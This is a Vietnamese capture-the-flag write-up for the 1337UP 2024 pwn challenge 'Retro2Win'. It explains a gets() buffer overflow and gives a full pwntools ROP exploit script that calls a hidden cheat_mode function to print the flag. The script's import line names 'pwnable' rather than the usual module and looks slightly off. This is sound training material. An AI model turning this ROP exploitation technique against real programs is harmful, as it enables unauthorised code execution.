# [1337UP-2024] Retro2Win
<p>Chương trình đưa ra 4 lựa chọn: 1, 2, 3 và 1337.</p>

![alt text](/thanhlai/post/pwnable/image/post6/image-1.png)

<p>Đầu tiên, ta sẽ xem hàm enter_cheatcode sau khi chọn 1337. Dòng 6, sử dụng hàm gets để đọc dữ liệu vào v1 -> Buffer overflow. Dòng 7, hàm printf leak ra chuỗi tại địa chỉ v1.</p>

![alt text](/thanhlai/post/pwnable/image/post6/image.png)

<p>Quan sát bảng Functions, ta có hàm cheat_mode in ra nội dung flag nếu giá trị tham số thứ 1 và 2 thỏa điều kiện.</p>

![alt text](/thanhlai/post/pwnable/image/post6/image-2.png)

<p>Sử dụng công cụ ropper lấy hai gadgets để set giá trị cho hai tham số. Trong gadget thứ 2, có lệnh pop r15 ở giữa nên cần padding thêm 8 byte sau khi lấy 8 byte ở rsp đem vào rsi.</p>

![alt text](/thanhlai/post/pwnable/image/post6/image-3.png)

<p>Script exploit:</p>

```
from pwnable import *

p = process('./retro2win')
elf = ELF('./retro2win')

p.sendlineafter(b'Select an option:', b'1337')

pop_rdi = p64(0x00000000004009b3)
pop_rsi = p64(0x00000000004009b1)
cheat_mode_addr = p64(elf.sym['cheat_mode'])

payload = b'a'*24 
payload += pop_rdi + p64(0x2323232323232323)
payload += pop_rsi + p64(0x4242424242424242)
payload += b'b' * 8
payload += cheat_mode_addr

p.sendlineafter(b'Enter your cheatcode:', payload)

p.interactive()
```

<p>Chạy script và lấy được flag thành công.</p>

![alt text](/thanhlai/post/pwnable/image/post6/image-5.png)